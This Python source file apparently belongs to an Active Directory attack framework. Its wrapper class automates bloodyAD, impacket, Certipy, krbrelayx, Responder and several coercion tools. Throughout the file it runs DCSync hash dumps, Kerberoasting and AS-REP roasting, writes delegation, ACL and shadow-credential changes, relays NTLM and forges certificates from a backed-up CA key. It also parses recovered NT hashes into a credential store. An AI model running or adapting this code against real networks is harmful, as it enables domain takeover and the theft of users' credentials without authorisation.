import shlex
import os
import re
import random
import logging

from pathlib import Path
from dataclasses import dataclass, field
from adutils import ADUtils
from auth_manager import AuthManager, AuthType, Credentials
from validators import ValidationError

logger = logging.getLogger(__name__)


@dataclass
class AuthParam:
    """A simple data class to hold authentication attributes."""

    auth: str = ""
    domain: str = ""
    username: str = ""
    password: str = ""
    ticket: str = ""

    def __post_init__(self):
        # Allows initialization with a dictionary, similar to the original __init__
        pass

    def __str__(self):
        """Provides a readable representation of the authentication parameters."""
        items = ", ".join(f"{k}='{v}'" for k, v in self.__dict__.items())
        return f"{self.__class__.__name__}({items})"


class Tool:
    """
    A unified class to handle authentication for various tools like impacket,
    bloodyAD, etc., by seamlessly building NTLM or Kerberos auth parameters.
    """

    def __init__(self, module):
        self.pane_a = module.pane_a
        self.registry = module.registry
        self.opts = module.opts
        self.run_command = module.run_command
        self.get_command_output = module.get_command_output
        self.tool_dir = module.tool_dir
        self.env = module.env
        self.module_path = module.path
        self.module = module
        self.step = 0
        self.auth = AuthParam()
        self.auth_manager = None  # Will be initialized when set_auth is called
        self.adutils = ADUtils()
        self.set_output_pane(module.pane_b)
        logger.debug(f"Tool initialized for module: {self.module_path}")

        domain_value = str(getattr(self.opts, "domain", "") or "").strip().strip("'\"")
        if hasattr(self.opts, "domain"):
            self.opts.domain = domain_value

        if domain_value and hasattr(self.opts, "dc_ip"):
            self.opts.dc_ip = self.adutils.get_dc_ip(self.opts.dc_ip, domain_value)
            self.opts.dc_hostname = self.adutils.get_dc_hostname(
                self.opts.dc_ip, domain_value
            )
        elif domain_value:
            self.opts.dc_ip = self.adutils.find_pdc(domain_value)
            self.opts.dc_hostname = self.adutils.get_dc_hostname(
                self.opts.dc_ip, domain_value
            )
        if domain_value and hasattr(self.opts, "ca_host"):
            self.opts.ca_host = self.adutils.ensure_ip_or_fqdn(
                self.opts.ca_host, domain_value
            )

    def title(self, str):
        self.step += 1
        self.output_pane.write(f"[cyan]Step {self.step}: {str}[/cyan]")

    def set_output_pane(self, pane):
        self.output_pane = pane

    def _is_required_option(self, option_name: str) -> bool:
        """Return True if an option is required by current module or its paired module."""
        modules = [self.module]
        paired_module = getattr(self.module, "paired_module", None)
        if paired_module:
            modules.append(paired_module)

        for module in modules:
            options = getattr(module, "options", {})
            option = options.get(option_name, {})
            if isinstance(option, dict) and option.get("required") is True:
                return True

        return False

    def _get_option_value_safely(self, module, option_name: str) -> str:
        """Get option value using module/global/default precedence without raising."""
        get_option_value = getattr(module, "get_option_value", None)
        if not callable(get_option_value):
            return ""

        try:
            value, _ = get_option_value(option_name)
            return value or ""
        except Exception:
            return ""

    def _resolve_auth_field_from_context(self, field_name: str) -> str:
        """
        Resolve auth field from runtime opts first, then module option lookup,
        then paired module runtime/option lookup.
        """
        value = getattr(self.opts, field_name, "")
        if value:
            return value

        value = self._get_option_value_safely(self.module, field_name)
        if value:
            return value

        paired_module = getattr(self.module, "paired_module", None)
        if not paired_module:
            return ""

        paired_opts = getattr(paired_module, "opts", None)
        if paired_opts:
            value = getattr(paired_opts, field_name, "")
            if value:
                return value

        return self._get_option_value_safely(paired_module, field_name)

    def set_auth(self, **kwargs) -> bool:
        """
        Configure authentication using AuthManager.

        Args:
            from_module: If True, populate from module options
            **kwargs: Override specific auth parameters

        Returns:
            True if auth configured successfully, False otherwise
        """
        try:
            # Populate self.auth from module options if requested
            if kwargs.get("from_module"):
                self.auth.auth = self._resolve_auth_field_from_context("auth")
                self.auth.domain = self._resolve_auth_field_from_context("domain")
                self.auth.username = self._resolve_auth_field_from_context("username")
                self.auth.password = self._resolve_auth_field_from_context("password")

            # Overwrite with any explicitly provided kwargs
            for k, v in kwargs.items():
                if hasattr(self.auth, k):
                    setattr(self.auth, k, v)

            # Validate essential auth info
            essential_fields = ("auth", "domain", "username")
            missing_essential = [
                field for field in essential_fields if not getattr(self.auth, field, "")
            ]

            if missing_essential:
                if kwargs.get("from_module"):
                    missing_required = [
                        field
                        for field in missing_essential
                        if self._is_required_option(field)
                    ]
                    if missing_required:
                        missing_list = ", ".join(missing_required)
                        self.pane_a.write(
                            f"[red]Error: Missing required auth info ({missing_list}).[/red]"
                        )
                        logger.error(
                            f"Missing required authentication information: {missing_list}"
                        )
                        return False

                    logger.debug(
                        "Skipping auth configuration; missing non-required fields: %s",
                        ", ".join(missing_essential),
                    )
                    return True

                self.pane_a.write(
                    "[red]Error: Missing essential auth info (auth, domain, username).[/red]"
                )
                logger.error("Missing essential authentication information")
                return False

            # Create AuthManager with current credentials
            auth_type = (
                AuthType.KERBEROS if self.auth.auth.lower() == "krb" else AuthType.NTLM
            )

            # Determine ticket path for Kerberos
            ticket_path = None
            if auth_type == AuthType.KERBEROS:
                ticket_path = self.auth.ticket or os.path.join(
                    self.module.logs_dir, f"{self.auth.username.lower()}.ccache"
                )

            # Create credentials
            credentials = Credentials(
                auth_type=auth_type,
                domain=self.auth.domain,
                username=self.auth.username,
                password=self.auth.password if self.auth.password else None,
                ticket_path=ticket_path,
            )

            # Validate credentials
            try:
                credentials.validate()
            except ValidationError as e:
                self.pane_a.write(f"[red]Error: {e}[/red]")
                logger.error(f"Credential validation failed: {e}")
                return False

            # Create AuthManager
            self.auth_manager = AuthManager(credentials, self.env, self.module.logs_dir)

            # Display ticket info for Kerberos
            if auth_type == AuthType.KERBEROS and ticket_path:
                self.output_pane.write(
                    f"[bold]{self.module_path}> export KRB5CCNAME={ticket_path}[/bold]"
                )

            logger.info(
                f"Authentication configured: {auth_type.value} for {self.auth.username}@{self.auth.domain}"
            )
            return True

        except Exception as e:
            self.pane_a.write(f"[red]Error configuring authentication: {e}[/red]")
            logger.error(f"Error in set_auth: {e}", exc_info=True)
            return False

    def get_auth_params(self, tool_type: str, target: str = None) -> list | None:
        """
        Get authentication parameters for a specific tool.

        Uses AuthManager for consistent parameter generation.

        Args:
            tool_type: Tool name ('impacket', 'certipy', 'bloodyad', etc.)
            target: Optional target hostname/IP

        Returns:
            List of command-line parameters, or None if auth manager not initialized
        """
        if not self.auth_manager:
            self.pane_a.write(
                "[red]Error: Authentication not configured. Call set_auth() first.[/red]"
            )
            logger.error("get_auth_params called before set_auth")
            return None

        try:
            if tool_type == "impacket":
                return self.auth_manager.get_impacket_params(target)
            elif tool_type == "certipy":
                return self.auth_manager.get_certipy_params()
            elif tool_type == "bloodyad":
                return self.auth_manager.get_bloodyad_params()
            elif tool_type == "petitpotam":
                return self.auth_manager.get_petitpotam_params()
            elif tool_type == "krbrelayx":
                return self.auth_manager.get_krbrelayx_params()
            else:
                self.pane_a.write(f"[red]Error: Unknown tool type '{tool_type}'.[/red]")
                logger.error(f"Unknown tool type requested: {tool_type}")
                return None

        except Exception as e:
            self.pane_a.write(f"[red]Error building auth params: {e}[/red]")
            logger.error(f"Error in get_auth_params: {e}", exc_info=True)
            return None

    def _extract_domain_from_impacket_auth_params(self, auth_params: list) -> str:
        """Extract DOMAIN from impacket auth params like DOMAIN/user[:pass]@target."""
        for param in auth_params:
            if not param or param.startswith("-") or param.startswith(":"):
                continue

            principal = param.split("@", 1)[0]
            if "/" not in principal:
                continue

            domain = principal.split("/", 1)[0].strip()
            if domain:
                return domain

        return ""

    def is_nt_hash(self, s: str) -> bool:
        """Checks if a string is a valid 32-character hexadecimal NT hash."""
        if not isinstance(s, str):
            return False
        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", s))

    async def add_computer_2(self, computer_name: str, computer_pass: str):
        return await self.bloodyad(
            ["add", "computer", computer_name, computer_pass], ["created"]
        )

    async def add_rbcd(self, target_principal: str, delegated_principal: str):
        return await self.bloodyad(
            ["add", "rbcd", target_principal, delegated_principal],
            ["can now impersonate"],
        )

    async def remove_rbcd(self, target_principal: str, delegated_principal: str):
        return await self.bloodyad(
            ["remove", "rbcd", target_principal, delegated_principal],
            ["can't impersonate"],
        )

    async def set_passwd(self, target_account: str, password: str):
        return await self.bloodyad(
            ["set", "password", target_account, password],
            ["password changed successfully"],
        )

    async def set_spn(self, target_account: str, spn: str):
        return await self.bloodyad(
            ["set", "object", target_account, "servicePrincipalName", "-v", spn],
            ["has been updated"],
        )

    async def remove_spn(self, target_account: str):
        return await self.bloodyad(
            ["set", "object", target_account, "servicePrincipalName"],
            ["has been updated"],
        )

    async def add_genericall(self, to_account: str, from_account):
        return await self.bloodyad(
            ["add", "genericAll", to_account, from_account], ["has now genericall"]
        )

    async def remove_genericall(self, to_account: str, from_account):
        return await self.bloodyad(
            ["remove", "genericAll", to_account, from_account],
            ["doesn't have genericall"],
        )

    async def add_shadowcredentials(self, target_account: str):
        return await self.bloodyad(
            ["add", "shadowCredentials", target_account], ["updated"]
        )

    async def bloodyad(self, params: list, success_conditions: list):
        auth_params = self.get_auth_params("bloodyad")
        if not auth_params:
            return False

        success = False
        self.output_pane.write(os.getcwd())
        command_parts = (
            ["../tools/.bin/bloodyAD", "--host", self.opts.dc_hostname, "--dc-ip", self.opts.dc_ip]
            + auth_params
            + params
        )

        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if any(x in line.lower() for x in success_conditions):
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write(
                "[red]Could not perform requested action with bloodyAD. Check permissions.[/red]"
            )

        return success

    async def add_computer(self, computer_name: str, computer_pass: str):

        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        if self.auth.auth == "krb":
            auth_params.append(self.auth.domain + "/" + self.auth.username)

        command_parts = [
            "../tools/.bin/addcomputer.py",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_pass,
            "-dc-host",
            self.opts.dc_hostname,
        ] + auth_params

        success = False
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "already exists" in line.lower() or "successfully added" in line.lower():
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write(
                "[red]Could not perform requested action with addcomputer.py. Check permissions.[/red]"
            )

        return success

    async def remove_computer(self, computer_name: str):

        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        if self.auth.auth == "krb":
            auth_params.append(self.auth.domain + "/" + self.auth.username)

        command_parts = (
            [
                "../tools/.bin/addcomputer.py",
                "-computer-name",
                computer_name,
                "-dc-host",
                self.opts.dc_hostname,
            ]
            + auth_params
            + ["-delete"]
        )

        success = False
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "deleted successfully" in line.lower():
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write(
                "[red]Could not perform requested action with addcomputer.py. Check permissions.[/red]"
            )

        return success

    async def get_st(self, params: list):

        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        command_parts = ["../tools/.bin/getST.py", "-dc-ip", self.opts.dc_ip] + params + auth_params

        if self.auth.auth == "krb":
            command_parts += [self.auth.domain + "/" + self.auth.username]

        ticket = Path()
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "does not have" in line or "SessionError" in line:
                line = f"[red]{line}[/red]"
            if line.startswith("[*] Saving ticket in "):
                ticket = Path(line[21:].strip())
                line = f"[green]{line}[/green]"
            self.output_pane.write(line)

        if not ticket.exists():
            self.output_pane.write(
                "[red]Could not obtain a service ticket. Check permissions.[/red]"
            )

        return str(ticket)

    async def get_tgt(self):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        command_parts = ["../tools/.bin/getTGT.py", "-dc-ip", self.opts.dc_ip] + auth_params

        ticket = Path()
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if line.startswith("[*] Saving ticket in "):
                ticket = Path(line[21:].strip())
                line = f"[green]{line}[/green]"
            self.output_pane.write(line)

        if not ticket.exists():
            self.output_pane.write(
                "[red]Could not obtain a TGT. Check permissions.[/red]"
            )

        return str(ticket)

    async def get_tgt_ext(self):
        auth_params = self.get_auth_params("impacket")

        if not auth_params:
            return False

        command_parts = ["../tools/.bin/getTGT.py", "-dc-ip", self.opts.dc_ip] + auth_params
        return await self.get_command_output(shlex.join(command_parts))

    async def smbclient(self, target: str, share: str = "C$", cmd: str = "ls"):

        auth_params = self.get_auth_params("impacket", target=target)
        if not auth_params:
            return False

        with open("smbclient.cmd", "w") as f:
            f.write(f"use {share}\n")
            f.write(f"{cmd}\n")
            f.write("exit\n")

        command_parts = ["../tools/.bin/smbclient.py", "-inputfile", "smbclient.cmd"] + auth_params
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            self.output_pane.write(line)

    async def read_dacl(self, target_account):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        all_dacls = [
            "WriteDACL",
            "FullControl",
            "ResetPassword",
            "WriteMembers",
            "DCSync",
        ]
        result_dacls = []
        command_parts = [
            "../tools/.bin/dacledit.py",
            "-action",
            "read",
            "-principal",
            self.opts.username,
            "-target",
            target_account,
        ] + auth_params
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            for acl in all_dacls:
                if acl in line:
                    line = f"[green]{line}[/green]"
                    result_dacls.append(acl)
            self.output_pane.write(line)
        return result_dacls

    async def write_dacl(self, target_account, dacl_type):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        command_parts = [
            "../tools/.bin/dacledit.py",
            "-action",
            "write",
            "-rights",
            dacl_type,
            "-principal",
            self.opts.username,
            "-target",
            target_account,
        ] + auth_params
        success = False
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "modified successfully" in line:
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write(
                "[red]Could not modify DACL with dacledit.py. Check permissions.[/red]"
            )

        return success

    async def dcsync(self, target_account="", domain_short=""):
        auth_params = self.get_auth_params("impacket", target=self.opts.dc_hostname)
        if not auth_params:
            return False

        resolved_domain_short = (domain_short or "").strip()
        if resolved_domain_short:
            for idx, param in enumerate(auth_params):
                if not param or param.startswith("-") or param.startswith(":"):
                    continue

                principal, sep, target = param.partition("@")
                if "/" not in principal:
                    continue

                _, username = principal.split("/", 1)
                auth_params[idx] = f"{resolved_domain_short}/{username}{sep}{target}"
                break

        user_param = ["-just-dc-user", target_account] if target_account != "" else []
        command_parts = (
            ["../tools/.bin/secretsdump.py", "-dc-ip", self.opts.dc_ip, "-just-dc-ntlm"]
            + user_param
            + auth_params
        )

        ret = []
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if ":500:" in line:
                line = f"[green]{line}[/green]"
            self.output_pane.write(line)
            if line.endswith(":::"):
                ret.append(line)
        return ret

    async def kerberoast(self, target_account=""):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        safe_user = re.sub(r"[^A-Za-z0-9._-]", "_", self.auth.username.lower())
        safe_target = re.sub(
            r"[^A-Za-z0-9._-]", "_", (target_account or "").lower()
        )
        output_file = Path(self.module.logs_dir) / (
            f"kerberoast_{safe_user}" + (f"_{safe_target}" if safe_target else "") + ".txt"
        )
        output_file.parent.mkdir(parents=True, exist_ok=True)

        account_param = (
            ["-request-user", target_account] if target_account != "" else []
        )
        command_parts = [
            "GetUserSPNs.py",
            "-request",
            "-outputfile",
            str(output_file),
            "-target-domain",
            self.opts.domain,
        ]

        if getattr(self.opts, "dc_ip", ""):
            command_parts += ["-dc-ip", self.opts.dc_ip]

        dc_host = (getattr(self.opts, "dc_host", "") or getattr(self.opts, "dc_hostname", "")).strip()
        if dc_host:
            command_parts += ["-dc-host", dc_host]

        command_parts += account_param + auth_params

        if self.auth.auth == "krb":
            command_parts += [f"{self.auth.domain}/{self.auth.username}"]

        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            self.output_pane.write(line)
        self.output_pane.write(f"[green]Kerberoast output saved to: {output_file}[/green]")

    async def asreproast(self):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        safe_user = re.sub(r"[^A-Za-z0-9._-]", "_", self.auth.username.lower())
        output_file = Path(self.module.logs_dir) / f"asreproast_{safe_user}.txt"
        output_file.parent.mkdir(parents=True, exist_ok=True)

        command_parts = [
            "../tools/.bin/GetNPUsers.py",
            "-request",
            "-outputfile",
            str(output_file),
            "-dc-ip",
            self.opts.dc_ip,
        ] + auth_params

        if self.auth.auth == "krb":
            command_parts += [self.opts.domain + "/"]

        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            self.output_pane.write(line)
        self.output_pane.write(f"[green]ASREPRoast output saved to: {output_file}[/green]")

    async def find_delegations(self, target_domain):
        auth_params = self.get_auth_params("impacket")
        if not auth_params:
            return False

        resolved_target_domain = (target_domain or "").strip()
        if not resolved_target_domain:
            resolved_target_domain = (
                self._extract_domain_from_impacket_auth_params(auth_params)
                or self.auth.domain
            )
            if not resolved_target_domain:
                self.pane_a.write(
                    "[red]Error: Missing target domain and unable to infer it from auth params.[/red]"
                )
                return False

        if self.auth.auth == "krb":
            if not self.auth.domain or not self.auth.username:
                self.pane_a.write(
                    "[red]Error: Kerberos auth requires domain and username for findDelegation target.[/red]"
                )
                return False

            has_positional_target = any(
                param and not param.startswith("-") and not param.startswith(":")
                for param in auth_params
            )
            if not has_positional_target:
                auth_params.append(f"{self.auth.domain}/{self.auth.username}")

        command_parts = [
            "../tools/.bin/findDelegation.py",
            "-target-domain",
            resolved_target_domain,
        ] + auth_params
        ret = []
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            self.output_pane.write(line)
            ret.append(line)

        return "\n".join(ret)

    ###################################
    ## Krbrelayx wrapper functions
    ###################################

    async def dnstool(self, params):
        auth_params = self.get_auth_params("krbrelayx")
        if not auth_params:
            return False

        success = False
        cmd = ["../tools/.bin/dnstool"] + auth_params + params
        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            if "completed successfully" in line or "Record already exists" in line:
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write("[red]Unable to add DNS record.[/red]")
            return False

        return success

    async def krbrelayx(self, params):

        success = False
        cmd = [
            "timeout",
            "10",
            "../tools/.bin/krbrelayx",
        ] + params
        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            if "Certificate successfully written" in line:
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        return success

    ###################################
    ## Coercers wrapper functions
    ###################################

    async def petitpotam(self, listen_ip, target):
        target = self.adutils.ensure_ip_or_fqdn(target, self.opts.domain)

        cmd = ["../tools/.bin/petitpotam"]

        if self.opts.username:
            auth_params = self.get_auth_params("petitpotam")
            if not auth_params:
                return False
            cmd.extend(auth_params)

        cmd.append(listen_ip)
        cmd.append(target)

        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            self.output_pane.write(line)

    async def dfscoerce(self, listen_ip, target):
        auth_params = self.get_auth_params("petitpotam")
        if not auth_params:
            return False

        target = self.adutils.ensure_ip_or_fqdn(target, self.opts.domain)

        cmd = (
            ["../tools/.bin/dfscoerce"]
            + auth_params
            + [listen_ip, target]
        )

        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            self.output_pane.write(line)

    async def printerbug(self, listen_ip, target):
        auth_params = self.get_auth_params("impacket", target=target)
        if not auth_params:
            return False

        target = self.adutils.ensure_ip_or_fqdn(target, self.opts.domain)

        cmd = (
            ["../tools/.bin/printerbug"]
            + auth_params
            + ["-dc-ip", self.opts.dc_ip, listen_ip]
        )
        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            self.output_pane.write(line)

    async def shadowcoerce(self, listen_ip, target):
        target = self.adutils.ensure_ip_or_fqdn(target, self.opts.domain)

        cmd = ["../tools/.bin/shadowcoerce"]
        if self.opts.username:
            auth_params = self.get_auth_params("petitpotam")
            if not auth_params:
                return False
            cmd.extend(auth_params)

        cmd.append(listen_ip)
        cmd.append(target)

        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            self.output_pane.write(line)

    ###################################
    ## Responder wrapper functions
    ###################################

    async def miniresponder(self, iface: str, respond_only: bool = False):
        cmd = ["../tools/.bin/miniresponder", "-I", iface]
        if respond_only:
            cmd.append("-respondonly")

        async for line in self.run_command(shlex.join(cmd), self.output_pane):
            self.output_pane.write(line)

        return True

    ###################################
    ## Certipy wrapper functions
    ###################################

    async def certipy_shadow(self, target_account):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        self.nthash = None

        if os.path.exists(target_account.lower() + ".ccache"):
            os.unlink(target_account.lower() + ".ccache")

        dc_host_param = (
            ["-dc-host", self.opts.dc_hostname] if self.auth.auth == "krb" else []
        )
        command_parts = (
            ["../tools/.bin/certipy", "shadow", "auto", "-account", target_account]
            + auth_params
            + dc_host_param
        )
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "already exists" in line:
                continue

            if line.startswith("[*] NT hash for "):
                hash_line = line.split()
                self.nthash = hash_line[-1].strip()
                if self.opts.domain:
                    user = hash_line[4].strip(" :'")
                    if self.registry.add_credential(
                        self.opts.domain, user, self.nthash
                    ):
                        self.pane_a.write(
                            f"✓ Added credential for `{user}@{self.opts.domain}` => `{self.nthash}`"
                        )
                line = f"[green]{line}[/green]"

            self.output_pane.write(line)

        if not self.nthash:
            self.output_pane.write("[red][!] Could not obtain credentials.[/red]")
            return False

        return self.nthash

    async def certipy_find(self):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        command_parts = (
            [
                "../tools/.bin/certipy", "find",
                "-dc-ip",
                self.opts.dc_ip,
                "-dc-host",
                self.opts.dc_hostname,
            ]
            + auth_params
            + ["-stdout", "-enabled", "-csv", "-out", self.opts.domain]
        )
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            self.output_pane.write(line)

        return True

    async def certipy_req(self, params):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        output_pfx = None
        if "-out" in params:
            output_pfx = Path(params[params.index("-out") + 1])
            if output_pfx.exists():
                output_pfx.unlink()

        self.request_id = None
        dc_host_param = (
            ["-dc-host", self.opts.dc_hostname] if self.auth.auth == "krb" else []
        )
        command_parts = (
            [
                "../tools/.bin/certipy", "req",
                "-ca",
                self.opts.ca_name,
                "-target",
                self.opts.ca_host,
                "-dc-ip",
                self.opts.dc_ip,
            ]
            + auth_params
            + dc_host_param
            + params
        )

        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if line.startswith("[*] Wrote certificate"):
                line = f"[green]{line}[/green]"
            elif line.startswith("[*] Request ID is "):
                self.request_id = line.split()[-1]
            self.output_pane.write(line)

        if output_pfx and not output_pfx.exists():
            self.output_pane.write("[red][!] Unable to request a certificate.[/red]")
            return False

        return True

    async def certipy_auth(self, pfx, params):
        success = False
        self.found_hash = None
        self.found_user = None
        self.found_domain = None

        ccache = pfx.lower().removesuffix(".pfx").strip("$") + ".ccache"
        ccache = Path(ccache)
        if ccache.exists():
            ccache.unlink()

        domain_value = getattr(self.opts, "domain", "")
        if isinstance(domain_value, str):
            domain_value = domain_value.strip().strip("'\"")
        else:
            domain_value = ""
        domain_param = (
            ["-domain", domain_value]
            if domain_value and "-domain" not in params
            else []
        )
        resolved_domain = domain_value
        if not resolved_domain and "-domain" in params:
            domain_idx = params.index("-domain") + 1
            if domain_idx < len(params):
                resolved_domain = str(params[domain_idx]).strip().strip("'\"")

        dc_ip_value = str(getattr(self.opts, "dc_ip", "") or "").strip().strip("'\"")
        if not dc_ip_value and resolved_domain:
            resolved_dc_ip = self.adutils.get_dc_ip("", resolved_domain)
            if resolved_dc_ip:
                dc_ip_value = resolved_dc_ip
                self.opts.dc_ip = resolved_dc_ip

        dc_ip_param = ["-dc-ip", dc_ip_value] if dc_ip_value else []
        command_parts = (
            ["../tools/.bin/certipy", "auth", "-pfx", pfx]
            + domain_param
            + dc_ip_param
            + params
        )
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if line.startswith("[*] Got hash for"):
                success = True
                tab = line.replace(":", " ").strip().split()
                self.found_user, self.found_domain = tab[4].strip("'").split("@")
                self.found_hash = tab[-1]
                line = f"[green]{line}[/green]"
            self.output_pane.write(line)

        if success:
            if not domain_value and self.found_domain:
                self.opts.domain = self.found_domain
            if not dc_ip_value and self.found_domain:
                resolved_dc_ip = self.adutils.get_dc_ip("", self.found_domain)
                if resolved_dc_ip:
                    self.opts.dc_ip = resolved_dc_ip
            if self.registry.add_credential(
                self.found_domain, self.found_user, self.found_hash
            ):
                self.pane_a.write(
                    f"✓ Added credential for `{self.found_user}@{self.found_domain}` => `{self.found_hash}`"
                )
        else:
            self.output_pane.write(
                "[red][!] Unable to authenticate using the certificate.[/red]"
            )

        return success

    async def certipy_template(self, params):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        dc_host_param = (
            ["-dc-host", self.opts.dc_hostname] if self.opts.auth == "krb" else []
        )
        command_parts = (
            ["../tools/.bin/certipy", "template"]
            + auth_params
            + dc_host_param
            + ["-dc-ip", self.opts.dc_ip]
            + params
        )
        success = False
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if line.startswith("[*] Successfully updated "):
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if not success:
            self.output_pane.write("[red][!] Unable to modify the template.[/red]")

        return success

    async def certipy_ca(self, params):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        if "-backup" in params:
            ca_pfx = Path(f"{self.opts.ca_name}.pfx")
            if ca_pfx.exists():
                ca_pfx.unlink()

        success = False

        dc_host_param = (
            ["-dc-host", self.opts.dc_hostname] if self.opts.auth == "krb" else []
        )
        command_parts = (
            ["../tools/.bin/certipy", "ca"]
            + auth_params
            + dc_host_param
            + [
                "-dc-ip",
                self.opts.dc_ip,
                "-ca",
                self.opts.ca_name,
                "-target",
                self.opts.ca_host,
            ]
            + params
        )
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if "-add-officer" in params and (
                "Successfully added officer" in line or "already has officer" in line
            ):
                success = True
            elif "-enable-template" in params and "Successfully enabled" in line:
                success = True
            elif "-issue-request" in params and line.startswith(
                "[*] Successfully issued certificate request"
            ):
                success = True
            elif "-backup" in params and line.startswith("[*] Wrote certificate "):
                match = re.search(r"'([^']+)'", line)
                if match:
                    ca_pfx_path_str = match.group(1)
                    ca_pfx_path = (Path(self.module.logs_dir) / ca_pfx_path_str).resolve()
                    new_pfx_path = (Path(self.module.logs_dir) / f"{self.opts.ca_name}.pfx").resolve()
                    ca_pfx_path.rename(new_pfx_path)
                    ca_pfx = new_pfx_path
                    line = line.replace(ca_pfx_path_str, new_pfx_path.name)
                    success = True

            if success:
                line = f"[green]{line}[/green]"

            self.output_pane.write(line)

        if "-backup" in params and not ca_pfx.exists():
            self.output_pane.write("[red][!] Unable to backup CA certificate.[/red]")
            return False

        elif "-add-officer" in params and not success:
            self.output_pane.write("[red][!] Could not add officer role to user.[/red]")
            return False

        elif "-enable-template" in params and not success:
            self.output_pane.write("[red][!] Could not add enable template.[/red]")
            return False

        elif "-issue-request" in params and not success:
            self.output_pane.write(
                "[red][!] Unable to approve pending certificate request.[/red]"
            )
            return False

        return True

    async def certipy_forge(self, ca_pfx, params):
        output = None
        if "-out" in params:
            output = Path(params[params.index("-out") + 1])
            if output.exists():
                output.unlink()

        success = False
        async for line in self.run_command(
            shlex.join(["../tools/.bin/certipy", "forge", "-ca-pfx", ca_pfx] + params),
            self.output_pane,
        ):
            if line.startswith(("[*] Wrote forged certificate", "[*] Wrote certificate")):
                success = True
            self.output_pane.write(line)

        if not output.exists():
            self.output_pane.write("[red][!] Unable to forge a certificate.[/red]")
            return False

        return success

    async def certipy_relay(self, params):
        success = False

        async for line in self.run_command(
            shlex.join(["../tools/.bin/certipy", "relay"] + params), self.output_pane
        ):
            if line.startswith(
                (
                    "[*] Writing ",
                    "[*] Certificate successfully written",
                    "[*] Wrote certificate and private key to",
                )
            ):
                self.output_pane.write(f"[green]{line}[/green]")
                success = True
            else:
                self.output_pane.write(line)

        if not success:
            self.output_pane.write(
                "[red][!] Relay failed to obtain a certificate.[/red]"
            )

        return success

    async def certipy_account(self, action, params):
        auth_params = self.get_auth_params("certipy")
        if not auth_params:
            return False

        self.upn = None
        success = False

        dc_host_param = (
            ["-dc-host", self.opts.dc_hostname] if self.opts.auth == "krb" else []
        )
        dc_target_param = (
            ["-target", self.opts.dc_hostname] if self.opts.auth == "krb" else []
        )

        command_parts = (
            ["../tools/.bin/certipy", "account", action]
            + auth_params
            + dc_host_param
            + dc_target_param
            + params
        )
        async for line in self.run_command(shlex.join(command_parts), self.output_pane):
            if action == "read" and line.strip().startswith("userPrincipalName"):
                self.upn = line.split()[-1]
                success = True
            # when using krb auth the response doesn't contain the userPrincipalName. we use the samAccountName instead.
            elif (
                action == "read"
                and line.strip().startswith("sAMAccountName")
                and not self.upn
            ):
                self.upn = line.split()[-1]
                success = True
            elif action == "update" and "Successfully updated" in line:
                line = f"[green]{line}[/green]"
                success = True
            elif action == "create" and (
                line.startswith("[*] Successfully created") or "already exists" in line
            ):
                line = f"[green]{line}[/green]"
                success = True
            elif action == "delete" and line.startswith("[*] Successfully deleted"):
                line = f"[green]{line}[/green]"
                success = True
            self.output_pane.write(line)

        if action == "read" and not self.upn:
            self.output_pane.write("[red][!] Could not find victim user's UPN.[/red]")

        elif action == "update" and not success:
            self.output_pane.write(
                "[red][!] Could not update the victim account.[/red]"
            )

        elif action == "create" and not success:
            self.output_pane.write("[red][!] Could not create the account.[/red]")

        elif action == "delete" and not success:
            self.output_pane.write(
                "[red][!] Unable to detele the computer account.[/red]"
            )

        return success
